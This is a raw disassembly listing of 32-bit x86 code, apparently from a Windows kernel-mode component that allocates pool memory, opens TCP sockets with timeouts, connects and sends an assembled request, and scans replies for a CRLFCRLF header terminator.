  4053fd:	cc                   	int3
  4053fe:	cc                   	int3
  4053ff:	cc                   	int3
  405400:	55                   	push   %ebp
  405401:	8b ec                	mov    %esp,%ebp
  405403:	83 ec 14             	sub    $0x14,%esp
  405406:	57                   	push   %edi
  405407:	8b 7d 08             	mov    0x8(%ebp),%edi
  40540a:	85 ff                	test   %edi,%edi
  40540c:	75 0e                	jne    0x40541c
  40540e:	8b 45 0c             	mov    0xc(%ebp),%eax
  405411:	89 38                	mov    %edi,(%eax)
  405413:	33 c0                	xor    %eax,%eax
  405415:	5f                   	pop    %edi
  405416:	8b e5                	mov    %ebp,%esp
  405418:	5d                   	pop    %ebp
  405419:	c2 08 00             	ret    $0x8
  40541c:	53                   	push   %ebx
  40541d:	56                   	push   %esi
  40541e:	68 7a 63 64 76       	push   $0x7664637a
  405423:	6a 2c                	push   $0x2c
  405425:	6a 01                	push   $0x1
  405427:	ff 15 f4 70 40 00    	call   *0x4070f4
  40542d:	8b f0                	mov    %eax,%esi
  40542f:	85 f6                	test   %esi,%esi
  405431:	0f 84 ac 00 00 00    	je     0x4054e3
  405437:	56                   	push   %esi
  405438:	ff 15 c8 70 40 00    	call   *0x4070c8
  40543e:	84 c0                	test   %al,%al
  405440:	0f 84 9d 00 00 00    	je     0x4054e3
  405446:	6a 2c                	push   $0x2c
  405448:	6a 00                	push   $0x0
  40544a:	56                   	push   %esi
  40544b:	e8 80 14 00 00       	call   0x4068d0
  405450:	8b 07                	mov    (%edi),%eax
  405452:	83 c4 0c             	add    $0xc,%esp
  405455:	89 06                	mov    %eax,(%esi)
  405457:	8b 47 04             	mov    0x4(%edi),%eax
  40545a:	89 46 04             	mov    %eax,0x4(%esi)
  40545d:	8b 47 08             	mov    0x8(%edi),%eax
  405460:	89 46 08             	mov    %eax,0x8(%esi)
  405463:	8b 47 0c             	mov    0xc(%edi),%eax
  405466:	89 46 0c             	mov    %eax,0xc(%esi)
  405469:	8b 47 10             	mov    0x10(%edi),%eax
  40546c:	89 46 10             	mov    %eax,0x10(%esi)
  40546f:	8b 47 14             	mov    0x14(%edi),%eax
  405472:	85 c0                	test   %eax,%eax
  405474:	74 27                	je     0x40549d
  405476:	50                   	push   %eax
  405477:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40547a:	50                   	push   %eax
  40547b:	ff 15 e4 70 40 00    	call   *0x4070e4
  405481:	6a 01                	push   $0x1
  405483:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405486:	50                   	push   %eax
  405487:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40548a:	50                   	push   %eax
  40548b:	ff 15 04 71 40 00    	call   *0x407104
  405491:	8b d8                	mov    %eax,%ebx
  405493:	85 db                	test   %ebx,%ebx
  405495:	78 1f                	js     0x4054b6
  405497:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40549a:	89 46 14             	mov    %eax,0x14(%esi)
  40549d:	8b 47 18             	mov    0x18(%edi),%eax
  4054a0:	89 46 18             	mov    %eax,0x18(%esi)
  4054a3:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4054a6:	50                   	push   %eax
  4054a7:	8b 47 1c             	mov    0x1c(%edi),%eax
  4054aa:	50                   	push   %eax
  4054ab:	e8 50 ff ff ff       	call   0x405400
  4054b0:	8b d8                	mov    %eax,%ebx
  4054b2:	85 db                	test   %ebx,%ebx
  4054b4:	79 17                	jns    0x4054cd
  4054b6:	68 7a 63 64 76       	push   $0x7664637a
  4054bb:	56                   	push   %esi
  4054bc:	ff 15 ac 71 40 00    	call   *0x4071ac
  4054c2:	5e                   	pop    %esi
  4054c3:	8b c3                	mov    %ebx,%eax
  4054c5:	5b                   	pop    %ebx
  4054c6:	5f                   	pop    %edi
  4054c7:	8b e5                	mov    %ebp,%esp
  4054c9:	5d                   	pop    %ebp
  4054ca:	c2 08 00             	ret    $0x8
  4054cd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4054d0:	89 46 28             	mov    %eax,0x28(%esi)
  4054d3:	8b 45 0c             	mov    0xc(%ebp),%eax
  4054d6:	89 30                	mov    %esi,(%eax)
  4054d8:	8b c3                	mov    %ebx,%eax
  4054da:	5e                   	pop    %esi
  4054db:	5b                   	pop    %ebx
  4054dc:	5f                   	pop    %edi
  4054dd:	8b e5                	mov    %ebp,%esp
  4054df:	5d                   	pop    %ebp
  4054e0:	c2 08 00             	ret    $0x8
  4054e3:	bb 9a 00 00 c0       	mov    $0xc000009a,%ebx
  4054e8:	5e                   	pop    %esi
  4054e9:	8b c3                	mov    %ebx,%eax
  4054eb:	5b                   	pop    %ebx
  4054ec:	5f                   	pop    %edi
  4054ed:	8b e5                	mov    %ebp,%esp
  4054ef:	5d                   	pop    %ebp
  4054f0:	c2 08 00             	ret    $0x8
  4054f3:	cc                   	int3
  4054f4:	cc                   	int3
  4054f5:	cc                   	int3
  4054f6:	cc                   	int3
  4054f7:	cc                   	int3
  4054f8:	cc                   	int3
  4054f9:	cc                   	int3
  4054fa:	cc                   	int3
  4054fb:	cc                   	int3
  4054fc:	cc                   	int3
  4054fd:	cc                   	int3
  4054fe:	cc                   	int3
  4054ff:	cc                   	int3
  405500:	55                   	push   %ebp
  405501:	8b ec                	mov    %esp,%ebp
  405503:	83 ec 08             	sub    $0x8,%esp
  405506:	56                   	push   %esi
  405507:	8b 75 08             	mov    0x8(%ebp),%esi
  40550a:	8b 46 28             	mov    0x28(%esi),%eax
  40550d:	85 c0                	test   %eax,%eax
  40550f:	74 06                	je     0x405517
  405511:	50                   	push   %eax
  405512:	e8 e9 ff ff ff       	call   0x405500
  405517:	8b 46 14             	mov    0x14(%esi),%eax
  40551a:	85 c0                	test   %eax,%eax
  40551c:	74 0b                	je     0x405529
  40551e:	50                   	push   %eax
  40551f:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405522:	50                   	push   %eax
  405523:	ff 15 b0 71 40 00    	call   *0x4071b0
  405529:	68 7a 63 64 76       	push   $0x7664637a
  40552e:	56                   	push   %esi
  40552f:	ff 15 ac 71 40 00    	call   *0x4071ac
  405535:	5e                   	pop    %esi
  405536:	8b e5                	mov    %ebp,%esp
  405538:	5d                   	pop    %ebp
  405539:	c2 04 00             	ret    $0x4
  40553c:	cc                   	int3
  40553d:	cc                   	int3
  40553e:	cc                   	int3
  40553f:	cc                   	int3
  405540:	55                   	push   %ebp
  405541:	8b ec                	mov    %esp,%ebp
  405543:	56                   	push   %esi
  405544:	8b 75 08             	mov    0x8(%ebp),%esi
  405547:	8b 04 b5 ac eb 40 00 	mov    0x40ebac(,%esi,4),%eax
  40554e:	50                   	push   %eax
  40554f:	e8 1c 0b 00 00       	call   0x406070
  405554:	33 c9                	xor    %ecx,%ecx
  405556:	c7 04 b5 ac eb 40 00 	movl   $0x0,0x40ebac(,%esi,4)
  40555d:	00 00 00 00 
  405561:	85 c0                	test   %eax,%eax
  405563:	5e                   	pop    %esi
  405564:	0f 99 c1             	setns  %cl
  405567:	8d 41 ff             	lea    -0x1(%ecx),%eax
  40556a:	5d                   	pop    %ebp
  40556b:	c2 04 00             	ret    $0x4
  40556e:	cc                   	int3
  40556f:	cc                   	int3
  405570:	55                   	push   %ebp
  405571:	8b ec                	mov    %esp,%ebp
  405573:	8b 45 08             	mov    0x8(%ebp),%eax
  405576:	ff 75 0c             	push   0xc(%ebp)
  405579:	8b 04 85 ac eb 40 00 	mov    0x40ebac(,%eax,4),%eax
  405580:	50                   	push   %eax
  405581:	e8 9a 0b 00 00       	call   0x406120
  405586:	33 c9                	xor    %ecx,%ecx
  405588:	85 c0                	test   %eax,%eax
  40558a:	0f 99 c1             	setns  %cl
  40558d:	8d 41 ff             	lea    -0x1(%ecx),%eax
  405590:	5d                   	pop    %ebp
  405591:	c2 0c 00             	ret    $0xc
  405594:	cc                   	int3
  405595:	cc                   	int3
  405596:	cc                   	int3
  405597:	cc                   	int3
  405598:	cc                   	int3
  405599:	cc                   	int3
  40559a:	cc                   	int3
  40559b:	cc                   	int3
  40559c:	cc                   	int3
  40559d:	cc                   	int3
  40559e:	cc                   	int3
  40559f:	cc                   	int3
  4055a0:	55                   	push   %ebp
  4055a1:	8b ec                	mov    %esp,%ebp
  4055a3:	83 ec 28             	sub    $0x28,%esp
  4055a6:	33 c0                	xor    %eax,%eax
  4055a8:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4055ab:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4055ae:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4055b1:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4055b4:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4055b7:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4055ba:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4055bd:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4055c0:	8b 45 08             	mov    0x8(%ebp),%eax
  4055c3:	53                   	push   %ebx
  4055c4:	56                   	push   %esi
  4055c5:	85 c0                	test   %eax,%eax
  4055c7:	0f 84 1e 01 00 00    	je     0x4056eb
  4055cd:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  4055d1:	0f 84 14 01 00 00    	je     0x4056eb
  4055d7:	8b 75 10             	mov    0x10(%ebp),%esi
  4055da:	85 f6                	test   %esi,%esi
  4055dc:	0f 84 09 01 00 00    	je     0x4056eb
  4055e2:	8b 5d 14             	mov    0x14(%ebp),%ebx
  4055e5:	85 db                	test   %ebx,%ebx
  4055e7:	0f 84 fe 00 00 00    	je     0x4056eb
  4055ed:	57                   	push   %edi
  4055ee:	50                   	push   %eax
  4055ef:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4055f2:	50                   	push   %eax
  4055f3:	ff 15 e4 70 40 00    	call   *0x4070e4
  4055f9:	6a 01                	push   $0x1
  4055fb:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4055fe:	50                   	push   %eax
  4055ff:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405602:	50                   	push   %eax
  405603:	ff 15 04 71 40 00    	call   *0x407104
  405609:	8b f8                	mov    %eax,%edi
  40560b:	85 ff                	test   %edi,%edi
  40560d:	0f 88 cd 00 00 00    	js     0x4056e0
  405613:	ff 75 0c             	push   0xc(%ebp)
  405616:	8d 45 d8             	lea    -0x28(%ebp),%eax
  405619:	50                   	push   %eax
  40561a:	ff 15 e4 70 40 00    	call   *0x4070e4
  405620:	6a 01                	push   $0x1
  405622:	8d 45 d8             	lea    -0x28(%ebp),%eax
  405625:	50                   	push   %eax
  405626:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405629:	50                   	push   %eax
  40562a:	ff 15 04 71 40 00    	call   *0x407104
  405630:	8b f8                	mov    %eax,%edi
  405632:	85 ff                	test   %edi,%edi
  405634:	0f 88 96 00 00 00    	js     0x4056d0
  40563a:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40563d:	50                   	push   %eax
  40563e:	56                   	push   %esi
  40563f:	e8 bc fd ff ff       	call   0x405400
  405644:	8b f8                	mov    %eax,%edi
  405646:	85 ff                	test   %edi,%edi
  405648:	78 76                	js     0x4056c0
  40564a:	8b 75 fc             	mov    -0x4(%ebp),%esi
  40564d:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405650:	50                   	push   %eax
  405651:	56                   	push   %esi
  405652:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405655:	50                   	push   %eax
  405656:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405659:	50                   	push   %eax
  40565a:	e8 11 0d 00 00       	call   0x406370
  40565f:	56                   	push   %esi
  405660:	8b f8                	mov    %eax,%edi
  405662:	e8 99 fe ff ff       	call   0x405500
  405667:	85 ff                	test   %edi,%edi
  405669:	78 55                	js     0x4056c0
  40566b:	8b 75 f8             	mov    -0x8(%ebp),%esi
  40566e:	8b 46 18             	mov    0x18(%esi),%eax
  405671:	0f b7 10             	movzwl (%eax),%edx
  405674:	66 89 13             	mov    %dx,(%ebx)
  405677:	8b 46 18             	mov    0x18(%esi),%eax
  40567a:	66 8b 40 02          	mov    0x2(%eax),%ax
  40567e:	66 89 43 02          	mov    %ax,0x2(%ebx)
  405682:	33 c0                	xor    %eax,%eax
  405684:	8b 4e 18             	mov    0x18(%esi),%ecx
  405687:	66 83 39 17          	cmpw   $0x17,(%ecx)
  40568b:	0f 94 c0             	sete   %al
  40568e:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  405695:	03 c8                	add    %eax,%ecx
  405697:	8b 01                	mov    (%ecx),%eax
  405699:	83 fa 17             	cmp    $0x17,%edx
  40569c:	75 17                	jne    0x4056b5
  40569e:	89 43 08             	mov    %eax,0x8(%ebx)
  4056a1:	8b 41 04             	mov    0x4(%ecx),%eax
  4056a4:	89 43 0c             	mov    %eax,0xc(%ebx)
  4056a7:	8b 41 08             	mov    0x8(%ecx),%eax
  4056aa:	89 43 10             	mov    %eax,0x10(%ebx)
  4056ad:	8b 41 0c             	mov    0xc(%ecx),%eax
  4056b0:	89 43 14             	mov    %eax,0x14(%ebx)
  4056b3:	eb 03                	jmp    0x4056b8
  4056b5:	89 43 04             	mov    %eax,0x4(%ebx)
  4056b8:	56                   	push   %esi
  4056b9:	e8 82 0c 00 00       	call   0x406340
  4056be:	33 ff                	xor    %edi,%edi
  4056c0:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  4056c4:	74 0a                	je     0x4056d0
  4056c6:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4056c9:	50                   	push   %eax
  4056ca:	ff 15 08 71 40 00    	call   *0x407108
  4056d0:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  4056d4:	74 0a                	je     0x4056e0
  4056d6:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4056d9:	50                   	push   %eax
  4056da:	ff 15 08 71 40 00    	call   *0x407108
  4056e0:	8b c7                	mov    %edi,%eax
  4056e2:	5f                   	pop    %edi
  4056e3:	5e                   	pop    %esi
  4056e4:	5b                   	pop    %ebx
  4056e5:	8b e5                	mov    %ebp,%esp
  4056e7:	5d                   	pop    %ebp
  4056e8:	c2 10 00             	ret    $0x10
  4056eb:	5e                   	pop    %esi
  4056ec:	83 c8 ff             	or     $0xffffffff,%eax
  4056ef:	5b                   	pop    %ebx
  4056f0:	8b e5                	mov    %ebp,%esp
  4056f2:	5d                   	pop    %ebp
  4056f3:	c2 10 00             	ret    $0x10
  4056f6:	cc                   	int3
  4056f7:	cc                   	int3
  4056f8:	cc                   	int3
  4056f9:	cc                   	int3
  4056fa:	cc                   	int3
  4056fb:	cc                   	int3
  4056fc:	cc                   	int3
  4056fd:	cc                   	int3
  4056fe:	cc                   	int3
  4056ff:	cc                   	int3
  405700:	55                   	push   %ebp
  405701:	8b ec                	mov    %esp,%ebp
  405703:	51                   	push   %ecx
  405704:	8b 45 08             	mov    0x8(%ebp),%eax
  405707:	ff 75 14             	push   0x14(%ebp)
  40570a:	8b 0c 85 ac eb 40 00 	mov    0x40ebac(,%eax,4),%ecx
  405711:	8b 45 10             	mov    0x10(%ebp),%eax
  405714:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405717:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40571a:	50                   	push   %eax
  40571b:	ff 75 0c             	push   0xc(%ebp)
  40571e:	51                   	push   %ecx
  40571f:	e8 4c 0d 00 00       	call   0x406470
  405724:	85 c0                	test   %eax,%eax
  405726:	78 09                	js     0x405731
  405728:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40572b:	8b e5                	mov    %ebp,%esp
  40572d:	5d                   	pop    %ebp
  40572e:	c2 10 00             	ret    $0x10
  405731:	83 c8 ff             	or     $0xffffffff,%eax
  405734:	8b e5                	mov    %ebp,%esp
  405736:	5d                   	pop    %ebp
  405737:	c2 10 00             	ret    $0x10
  40573a:	cc                   	int3
  40573b:	cc                   	int3
  40573c:	cc                   	int3
  40573d:	cc                   	int3
  40573e:	cc                   	int3
  40573f:	cc                   	int3
  405740:	55                   	push   %ebp
  405741:	8b ec                	mov    %esp,%ebp
  405743:	51                   	push   %ecx
  405744:	8b 45 08             	mov    0x8(%ebp),%eax
  405747:	ff 75 14             	push   0x14(%ebp)
  40574a:	8b 0c 85 ac eb 40 00 	mov    0x40ebac(,%eax,4),%ecx
  405751:	8b 45 10             	mov    0x10(%ebp),%eax
  405754:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405757:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40575a:	50                   	push   %eax
  40575b:	ff 75 0c             	push   0xc(%ebp)
  40575e:	51                   	push   %ecx
  40575f:	e8 4c 0d 00 00       	call   0x4064b0
  405764:	85 c0                	test   %eax,%eax
  405766:	78 09                	js     0x405771
  405768:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40576b:	8b e5                	mov    %ebp,%esp
  40576d:	5d                   	pop    %ebp
  40576e:	c2 10 00             	ret    $0x10
  405771:	83 c8 ff             	or     $0xffffffff,%eax
  405774:	8b e5                	mov    %ebp,%esp
  405776:	5d                   	pop    %ebp
  405777:	c2 10 00             	ret    $0x10
  40577a:	cc                   	int3
  40577b:	cc                   	int3
  40577c:	cc                   	int3
  40577d:	cc                   	int3
  40577e:	cc                   	int3
  40577f:	cc                   	int3
  405780:	55                   	push   %ebp
  405781:	8b ec                	mov    %esp,%ebp
  405783:	ff 75 18             	push   0x18(%ebp)
  405786:	8b 45 08             	mov    0x8(%ebp),%eax
  405789:	ff 75 14             	push   0x14(%ebp)
  40578c:	ff 75 10             	push   0x10(%ebp)
  40578f:	8b 04 85 ac eb 40 00 	mov    0x40ebac(,%eax,4),%eax
  405796:	ff 75 0c             	push   0xc(%ebp)
  405799:	50                   	push   %eax
  40579a:	e8 c1 0e 00 00       	call   0x406660
  40579f:	33 c9                	xor    %ecx,%ecx
  4057a1:	85 c0                	test   %eax,%eax
  4057a3:	0f 99 c1             	setns  %cl
  4057a6:	8d 41 ff             	lea    -0x1(%ecx),%eax
  4057a9:	5d                   	pop    %ebp
  4057aa:	c2 14 00             	ret    $0x14
  4057ad:	cc                   	int3
  4057ae:	cc                   	int3
  4057af:	cc                   	int3
  4057b0:	55                   	push   %ebp
  4057b1:	8b ec                	mov    %esp,%ebp
  4057b3:	51                   	push   %ecx
  4057b4:	ff 75 10             	push   0x10(%ebp)
  4057b7:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4057ba:	ff 75 0c             	push   0xc(%ebp)
  4057bd:	ff 75 08             	push   0x8(%ebp)
  4057c0:	50                   	push   %eax
  4057c1:	e8 7a 0a 00 00       	call   0x406240
  4057c6:	85 c0                	test   %eax,%eax
  4057c8:	78 25                	js     0x4057ef
  4057ca:	8b 0d b0 0b 41 00    	mov    0x410bb0,%ecx
  4057d0:	8b c1                	mov    %ecx,%eax
  4057d2:	25 ff 07 00 00       	and    $0x7ff,%eax
  4057d7:	40                   	inc    %eax
  4057d8:	41                   	inc    %ecx
  4057d9:	89 0d b0 0b 41 00    	mov    %ecx,0x410bb0
  4057df:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4057e2:	89 0c 85 ac eb 40 00 	mov    %ecx,0x40ebac(,%eax,4)
  4057e9:	8b e5                	mov    %ebp,%esp
  4057eb:	5d                   	pop    %ebp
  4057ec:	c2 0c 00             	ret    $0xc
  4057ef:	83 c8 ff             	or     $0xffffffff,%eax
  4057f2:	8b e5                	mov    %ebp,%esp
  4057f4:	5d                   	pop    %ebp
  4057f5:	c2 0c 00             	ret    $0xc
  4057f8:	cc                   	int3
  4057f9:	cc                   	int3
  4057fa:	cc                   	int3
  4057fb:	cc                   	int3
  4057fc:	cc                   	int3
  4057fd:	cc                   	int3
  4057fe:	cc                   	int3
  4057ff:	cc                   	int3
  405800:	80 3d b4 0b 41 00 00 	cmpb   $0x0,0x410bb4
  405807:	74 0c                	je     0x405815
  405809:	e8 12 0b 00 00       	call   0x406320
  40580e:	c6 05 b4 0b 41 00 00 	movb   $0x0,0x410bb4
  405815:	c3                   	ret
  405816:	cc                   	int3
  405817:	cc                   	int3
  405818:	cc                   	int3
  405819:	cc                   	int3
  40581a:	cc                   	int3
  40581b:	cc                   	int3
  40581c:	cc                   	int3
  40581d:	cc                   	int3
  40581e:	cc                   	int3
  40581f:	cc                   	int3
  405820:	55                   	push   %ebp
  405821:	8b ec                	mov    %esp,%ebp
  405823:	53                   	push   %ebx
  405824:	56                   	push   %esi
  405825:	8b 75 0c             	mov    0xc(%ebp),%esi
  405828:	57                   	push   %edi
  405829:	8b 7d 10             	mov    0x10(%ebp),%edi
  40582c:	83 c6 fc             	add    $0xfffffffc,%esi
  40582f:	83 d7 ff             	adc    $0xffffffff,%edi
  405832:	85 ff                	test   %edi,%edi
  405834:	72 40                	jb     0x405876
  405836:	77 04                	ja     0x40583c
  405838:	85 f6                	test   %esi,%esi
  40583a:	74 3a                	je     0x405876
  40583c:	8b 45 08             	mov    0x8(%ebp),%eax
  40583f:	bb fe ff ff ff       	mov    $0xfffffffe,%ebx
  405844:	2b d8                	sub    %eax,%ebx
  405846:	8d 48 02             	lea    0x2(%eax),%ecx
  405849:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  405850:	80 79 fe 0d          	cmpb   $0xd,-0x2(%ecx)
  405854:	75 11                	jne    0x405867
  405856:	80 79 ff 0a          	cmpb   $0xa,-0x1(%ecx)
  40585a:	75 0b                	jne    0x405867
  40585c:	80 39 0d             	cmpb   $0xd,(%ecx)
  40585f:	75 06                	jne    0x405867
  405861:	80 79 01 0a          	cmpb   $0xa,0x1(%ecx)
  405865:	74 19                	je     0x405880
  405867:	41                   	inc    %ecx
  405868:	8d 04 0b             	lea    (%ebx,%ecx,1),%eax
  40586b:	99                   	cltd
  40586c:	3b d7                	cmp    %edi,%edx
  40586e:	77 06                	ja     0x405876
  405870:	72 de                	jb     0x405850
  405872:	3b c6                	cmp    %esi,%eax
  405874:	72 da                	jb     0x405850
  405876:	8b 45 08             	mov    0x8(%ebp),%eax
  405879:	5f                   	pop    %edi
  40587a:	5e                   	pop    %esi
  40587b:	5b                   	pop    %ebx
  40587c:	5d                   	pop    %ebp
  40587d:	c2 0c 00             	ret    $0xc
  405880:	5f                   	pop    %edi
  405881:	5e                   	pop    %esi
  405882:	8d 41 02             	lea    0x2(%ecx),%eax
  405885:	5b                   	pop    %ebx
  405886:	5d                   	pop    %ebp
  405887:	c2 0c 00             	ret    $0xc
  40588a:	cc                   	int3
  40588b:	cc                   	int3
  40588c:	cc                   	int3
  40588d:	cc                   	int3
  40588e:	cc                   	int3
  40588f:	cc                   	int3
  405890:	55                   	push   %ebp
  405891:	8b ec                	mov    %esp,%ebp
  405893:	81 ec 44 0e 00 00    	sub    $0xe44,%esp
  405899:	a1 a4 a7 40 00       	mov    0x40a7a4,%eax
  40589e:	33 c5                	xor    %ebp,%eax
  4058a0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4058a3:	56                   	push   %esi
  4058a4:	8b 75 08             	mov    0x8(%ebp),%esi
  4058a7:	8d 85 dc f1 ff ff    	lea    -0xe24(%ebp),%eax
  4058ad:	57                   	push   %edi
  4058ae:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4058b1:	68 10 04 00 00       	push   $0x410
  4058b6:	6a 00                	push   $0x0
  4058b8:	50                   	push   %eax
  4058b9:	e8 12 10 00 00       	call   0x4068d0
  4058be:	83 c4 0c             	add    $0xc,%esp
  4058c1:	80 3d b4 0b 41 00 00 	cmpb   $0x0,0x410bb4
  4058c8:	0f 84 3c 02 00 00    	je     0x405b0a
  4058ce:	8d 85 dc f1 ff ff    	lea    -0xe24(%ebp),%eax
  4058d4:	50                   	push   %eax
  4058d5:	56                   	push   %esi
  4058d6:	e8 55 05 00 00       	call   0x405e30
  4058db:	84 c0                	test   %al,%al
  4058dd:	0f 84 27 02 00 00    	je     0x405b0a
  4058e3:	68 00 08 00 00       	push   $0x800
  4058e8:	8d 85 fc f5 ff ff    	lea    -0xa04(%ebp),%eax
  4058ee:	6a 00                	push   $0x0
  4058f0:	50                   	push   %eax
  4058f1:	e8 da 0f 00 00       	call   0x4068d0
  4058f6:	68 00 02 00 00       	push   $0x200
  4058fb:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  405901:	6a 00                	push   $0x0
  405903:	50                   	push   %eax
  405904:	e8 c7 0f 00 00       	call   0x4068d0
  405909:	83 c4 18             	add    $0x18,%esp
  40590c:	6a 01                	push   $0x1
  40590e:	e8 1d c2 ff ff       	call   0x401b30
  405913:	50                   	push   %eax
  405914:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  40591a:	50                   	push   %eax
  40591b:	e8 ed 0f 00 00       	call   0x40690d
  405920:	83 c4 08             	add    $0x8,%esp
  405923:	8d 85 dc f1 ff ff    	lea    -0xe24(%ebp),%eax
  405929:	80 bd dc f1 ff ff 00 	cmpb   $0x0,-0xe24(%ebp)
  405930:	75 05                	jne    0x405937
  405932:	b8 e6 6d 40 00       	mov    $0x406de6,%eax
  405937:	50                   	push   %eax
  405938:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  40593e:	50                   	push   %eax
  40593f:	e8 c9 0f 00 00       	call   0x40690d
  405944:	83 c4 08             	add    $0x8,%esp
  405947:	6a 02                	push   $0x2
  405949:	e8 e2 c1 ff ff       	call   0x401b30
  40594e:	50                   	push   %eax
  40594f:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  405955:	50                   	push   %eax
  405956:	e8 b2 0f 00 00       	call   0x40690d
  40595b:	8d 85 ec f3 ff ff    	lea    -0xc14(%ebp),%eax
  405961:	50                   	push   %eax
  405962:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  405968:	50                   	push   %eax
  405969:	e8 9f 0f 00 00       	call   0x40690d
  40596e:	83 c4 10             	add    $0x10,%esp
  405971:	6a 04                	push   $0x4
  405973:	e8 b8 c1 ff ff       	call   0x401b30
  405978:	50                   	push   %eax
  405979:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  40597f:	50                   	push   %eax
  405980:	e8 88 0f 00 00       	call   0x40690d
  405985:	83 c4 08             	add    $0x8,%esp
  405988:	c7 85 c8 f1 ff ff 00 	movl   $0x0,-0xe38(%ebp)
  40598f:	00 00 00 
  405992:	8d 85 ec f5 ff ff    	lea    -0xa14(%ebp),%eax
  405998:	c7 85 cc f1 ff ff 00 	movl   $0x0,-0xe34(%ebp)
  40599f:	00 00 00 
  4059a2:	c7 85 d0 f1 ff ff 00 	movl   $0x0,-0xe30(%ebp)
  4059a9:	00 00 00 
  4059ac:	c7 85 d4 f1 ff ff 00 	movl   $0x0,-0xe2c(%ebp)
  4059b3:	00 00 00 
  4059b6:	50                   	push   %eax
  4059b7:	8d 85 bc f1 ff ff    	lea    -0xe44(%ebp),%eax
  4059bd:	c7 85 d8 f1 ff ff 00 	movl   $0x0,-0xe28(%ebp)
  4059c4:	00 00 00 
  4059c7:	50                   	push   %eax
  4059c8:	8d 85 dc f3 ff ff    	lea    -0xc24(%ebp),%eax
  4059ce:	c7 85 bc f1 ff ff 02 	movl   $0x2,-0xe44(%ebp)
  4059d5:	00 00 00 
  4059d8:	50                   	push   %eax
  4059d9:	8d 85 ec f3 ff ff    	lea    -0xc14(%ebp),%eax
  4059df:	c7 85 c0 f1 ff ff 00 	movl   $0x0,-0xe40(%ebp)
  4059e6:	00 00 00 
  4059e9:	50                   	push   %eax
  4059ea:	c7 85 c4 f1 ff ff 01 	movl   $0x1,-0xe3c(%ebp)
  4059f1:	00 00 00 
  4059f4:	e8 a7 fb ff ff       	call   0x4055a0
  4059f9:	6a 06                	push   $0x6
  4059fb:	6a 01                	push   $0x1
  4059fd:	6a 02                	push   $0x2
  4059ff:	e8 ac fd ff ff       	call   0x4057b0
  405a04:	6a 04                	push   $0x4
  405a06:	68 88 a7 40 00       	push   $0x40a788
  405a0b:	68 05 10 00 00       	push   $0x1005
  405a10:	8b f0                	mov    %eax,%esi
  405a12:	68 ff ff 00 00       	push   $0xffff
  405a17:	56                   	push   %esi
  405a18:	e8 63 fd ff ff       	call   0x405780
  405a1d:	6a 04                	push   $0x4
  405a1f:	68 88 a7 40 00       	push   $0x40a788
  405a24:	68 06 10 00 00       	push   $0x1006
  405a29:	68 ff ff 00 00       	push   $0xffff
  405a2e:	56                   	push   %esi
  405a2f:	e8 4c fd ff ff       	call   0x405780
  405a34:	85 f6                	test   %esi,%esi
  405a36:	0f 84 a6 00 00 00    	je     0x405ae2
  405a3c:	6a 10                	push   $0x10
  405a3e:	8d 85 ec f5 ff ff    	lea    -0xa14(%ebp),%eax
  405a44:	50                   	push   %eax
  405a45:	56                   	push   %esi
  405a46:	e8 25 fb ff ff       	call   0x405570
  405a4b:	83 f8 ff             	cmp    $0xffffffff,%eax
  405a4e:	0f 84 88 00 00 00    	je     0x405adc
  405a54:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  405a5a:	6a 00                	push   $0x0
  405a5c:	50                   	push   %eax
  405a5d:	e8 87 0e 00 00       	call   0x4068e9
  405a62:	83 c4 04             	add    $0x4,%esp
  405a65:	40                   	inc    %eax
  405a66:	50                   	push   %eax
  405a67:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  405a6d:	50                   	push   %eax
  405a6e:	56                   	push   %esi
  405a6f:	e8 cc fc ff ff       	call   0x405740
  405a74:	83 f8 ff             	cmp    $0xffffffff,%eax
  405a77:	74 63                	je     0x405adc
  405a79:	80 3d 04 a8 40 00 00 	cmpb   $0x0,0x40a804
  405a80:	75 5a                	jne    0x405adc
  405a82:	b9 00 08 00 00       	mov    $0x800,%ecx
  405a87:	8d 85 fc f5 ff ff    	lea    -0xa04(%ebp),%eax
